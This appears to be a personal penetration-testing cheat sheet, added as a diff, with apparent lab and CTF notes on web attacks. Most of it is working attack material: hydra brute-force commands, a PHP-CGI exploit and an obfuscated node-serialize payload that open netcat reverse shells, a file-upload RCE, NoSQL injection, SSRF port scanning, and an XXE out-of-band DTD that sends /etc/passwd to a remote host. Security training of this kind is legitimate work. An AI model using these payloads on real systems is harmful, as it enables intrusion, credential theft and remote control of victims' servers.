@@ -1,0 +1,214 @@
+standard when port 80 is open:
+nikto -host 1.1.1.1 -p 80 > nikto_out; dirb http://1.1.1.1 /usr/share/wordlists/all-dirs-actual.txt > dirb_out; whatweb -v 1.1.1.1 > whatweb_out; 
+
+
+
+gobuster -u http://1.1.1.1 -w /usr/share/wordlists/all-dirs-actual.txt -s '200,204,301,302,307,403,500' -e 
+php extensions
+/login.php?
+/phpmyadmin/index.php
+
+http2.0 ssl/wireshark exercise
+"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -icognito --ssl-key-log-file="C:\Users\bob factor\Downloads\sans holiday challenge\sslkeys.txt" --new-window "https://packalyzer.kringlecastle.com/"
+capture login, load ssl file into wireshark -> edit > preferences > protocols > ssl > master log file name
+
+/usr/share/dirbuster/wordlists/
+
+hydra 192.168.121.159 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l null -P /usr/share/dirb/wordlists/big.txt -o hydra_kzMb5nVYJw-index.php_out -t 30
+hydra 1.1.1.1 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+hydra 1.1.1.1 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+
+tomcat password spraying
+hydra -l admin -P pass.txt -s 8080 -f 10.10.10.95 http-get /manager/html -t 10 -w 30
+use ncrack for ssh
+
+hydra 10.11.1.251 http-form-post "/wp/wp-login.php:log=^USER^&pwd=^PASS^:Incorrect password." -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+
+
+hydra 1.1.1.1 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+
+hydra -t 5 -V -f -L userlist -P passwordlist ftp://192.168.34.16
+
+-t 5 this sets the number of tasks or logins it will try simultaneously. I have gone for 5 here but just remember don’t go too high as it may give you false results.
+-V Verbose this will display the login and password it tries in the terminal for each attempt/
+-f Quits once hydra has found a positive Username and Password match.
+-L userlist The capital -L  here means I’m using a wordlist of usernames called userlist if a -l was used this specifies a single username to try.
+-P passwordlist The capital -P here means I’m using a word list called passwordlist if a -p was used this specifies a single password to try.
+ftp://192.168.34.16 
+
+php remote curl exploit 4.3-5.2
+
+curl -i -s -k -X 'POST' --data-binary "<?php system(\"nc 1.1.1.1 4456 -e /bin/sh\"); die; ?>" \"http://2.2.2.2/cgi-bin/php5?%2dd+allow_url_include%3don+%2dd+safe_mode%3doff+%2dd+suhosin%2esimulation%3don+%2dd+disable_functions%3d%22%22+%2dd+open_basedir%3dnone+%2dd+auto_prepend_file%3dphp%3a%2f%2finput+%2dd+cgi%2eforce_redirect%3d0+%2dd+cgi%2eredirect_status_env%3d0+%2dn"
+
+  
+
+#!/bin/bash
+data-binary "<?php system(\"$2\"); die; ?>" \
+  "http://$1/cgi-bin/php5?%2dd+allow_url_include%3don+%2dd+safe_mode%3doff+%2dd+suhosin%2esimulation%3don+%2dd+disable_functions%3d%22%22+%2dd+open_basedir%3dnone+%2dd+auto_prepend_file%3dphp%3a%2f%2finput+%2dd+cgi%2eforce_redirect%3d0+%2dd+cgi%2eredirect_status_env%3d0+%2dn"
+  
+php file inclusion
+curl -X POST -d "file=/etc/passwd" http://1.1.1.1:8011/api/files_api.php
+curl -X POST -d "file=/var/www/development/uploader/frankuploads/php-rev-shell.gif" http://1.1.1.1:8011/api/files_api.php --output -
+
+generate wordlist
+cewl http://1.1.1.1/ -d 1 -m 5 -w wordlist.txt
+cewl http://1.1.1.1/ -w wordlist.txt
+
+cat wordlist.txt >> wl_iter
+cat wordlist.txt | tr 'a-z' 'A-Z' >> wl_iter
+cat wordlist.txt | tr 'A-Z' 'a-z' >> wl_iter
+cat wl_iter | sort -u > wl_final
+john hash1 --rules=robtest --wordlist=wordlist_final
+john --rules=robtest --wordlist=wordlist_final --stdout | wc -l
+#current vm will attempt about 1 mil per min - tested with 13mil
+
+john --rules=any2atend --wordlist=passlist1 --stdout | wc -l
+/etc/john.john.conf custom rule robtest
+[List.Rules:robtest]
+$[0-9]
+$[0-9]$[0-9]
+$[0-9]$[0-9]$[0-9]
+$[0-9]$[0-9]$[0-9]$[0-9]
+$[!@#$%^&*()_+]
+$[!@#$%^&*()_+]$[!@#$%^&*()_+]
+$[!@#$%^&*()_+]$[!@#$%^&*()_+]$[!@#$%^&*()_+]
+$[!@#$%^&*()_+]$[!@#$%^&*()_+]$[!@#$%^&*()_+]$[!@#$%^&*()_+]
+
+
+initial investigations
+recommended tool building
+    An HTTP client using a traditional HTTP library (like Ruby's net/http) and one using sockets only that allows you to send basic GET and POST requests.
+    An HTTP client that supports SSL (both with HTTP library and with socket only).
+    An HTTP client that supports cookies (both with HTTP library and with socket only).
+
+host header used by server to id which site you're trying to access, used for virtual hosting when server hosts more than 1 website
+php sessions stored by default in /var/lib/php5/
+
+telnet/visit site/ check robots.txt / check sources
+
+zap
+send bad request, check error page
+An easy test with a PHP applications is to replace /index.php?name=hacker with /index.php?name[]=hacker.
+
+typical separators  ', ", `
+
+There are three types of XSS:
+    Reflected: the payload is directly echoed back in the response.
+    Stored: the payload can be echoed back directly in the response but will more importantly be echoed back in the response when you come back to this page or to another page. The payload is stored in the backend of the application.
+    DOM-based: the payload is not echoed back in the page. It gets executed dynamically when the browser renders the page.
+
+<script>alert(1)</script>
+
+
+beef-xss
+<script src="http://192.168.121.131:3000/hook.js"></script>
+<script>alert(1)</script>
+1;alert(1);
+
+xss protection involved xlating the <|> into &lt|&gt
+
+jsfuck.com
+
+proxying in burp - sql
+
+nosql
+{"username":"admin","password":"asdf"}
+becomes
+{"username":"admin","password":{"$gt":""}}
+
+nosql 2
+username=admin&password=Greasdfjinpassword2&submit=login
+becomes
+username=admin&password[$gt]=&submit=login
+or
+username[$gt]=admin&password[$gt]=&submit=login
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection
+
+Deserialization in NodeJS:
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('cat /etc/passwd >> /opt/web/chatSupportSystems/public/hacked.txt', function(error, stdout, stderr) { console.log(stdout) });}()"}
+
+reverse shell in node.js, use nodejsshell.py and base64 encode
+for decoded base64 string {"module":"node-serialize"}
+{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,50,49,46,49,51,52,34,59,10,80,79,82,84,61,34,52,52,53,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
+
+php object injection
+https://securitycafe.ro/2015/01/05/understanding-php-object-injection/
+
+
+template injection example
+xss vuln
+burp send to repeater string with /ti?user=
+#checking for evaluation, didn't work:
+GET /ti?user=9*9&comment=test&link= HTTP/1.1
+#this did work, newline, =, url encoding
+GET /ti?user=%0a%3d9*9&comment=test&link= HTTP/1.1
+#next tried to get global... %0a%3d%20 required for newline = and whitespace
+GET /ti?user=%0a%3d%20%67%6c%6f%62%61%6c&comment=test&link= HTTP/1.1
+
+
+JavaScript Upload RCE:
+
+create file with this in it:
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc 192.168.121.132 4456 -e /bin/bash')
+
+look for path in the http response:
+{path:"uploads/5d080947f9425d68d31c80b6443e93a1"}
+
+uploads/5d080947f9425d68d31c80b6443e93a1
+this request returned reverse shell
+http://192.168.121.128:3000/drouting?filename=../uploads/5d080947f9425d68d31c80b6443e93a1
+
+ssrf
+#initial check should return the webpage when navigated to:
+http://192.168.121.128:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
+#after we sent this, find the request and send to intruder
+#positions > clear$$, add$$ to port 3000
+#get request looks like this
+GET /ssrf?user=&comment=&link=http://127.0.0.1:Â§3000Â§ HTTP/1.1
+
+payloads > payload type > numbers
+typically pick all ports, but trimmed down for lab to 28000 28100
+step: 1
+
+We see a larger response length from 28017, so we go here
+http://192.168.121.128:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017
+further links can be followed: 
+http://192.168.121.128:3000/serverStatus?text=1
+becomes
+http://192.168.121.128:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017/serverStatus?text=1
+
+send post request
+curl -X POST --data "param1=value1" --data "param2=value2" https://example.com/resource.cgi
+
+
+
+xxe xml external entities
+send post XML request to repeater
+changed data:
+%3C%3Fxml+version%3D%221.0%22+%3F%3E%3C%21DOCTYPE+thp+%5B+%3C%21ELEMENT+thp+ANY%3E%3C%21ENTITY+book+%22Universe%22%3E%5D%3E%3Cthp%3EHack+The+%26book%3B%3C%2Fthp%3E
+decoded as url to:
+<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book "Universe">]><thp>Hack The &book;</thp>
+to exploit, changed to:
+<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The %26book%3B</thp>
+
+xxe oob
+modify data to this:
+<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY ><!ENTITY % dtd SYSTEM "http://192.168.121.134/xxeoob"> %dtd;]><thp><error>%26send%3B</error></thp>
+
+craeted a file with this in it /var/www/html/xxeoob
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.121.134:4456/collect=%file;'>">
+%all;
+listen on port 4456, this will send back /etc/passwd to us, decode as base64
+
+spray.sh
+
+
+session hijacking with xss in php example used firebug to change php session id
+
+if mitm is possible, follow tcp stream and use phpsessid
+
+
+
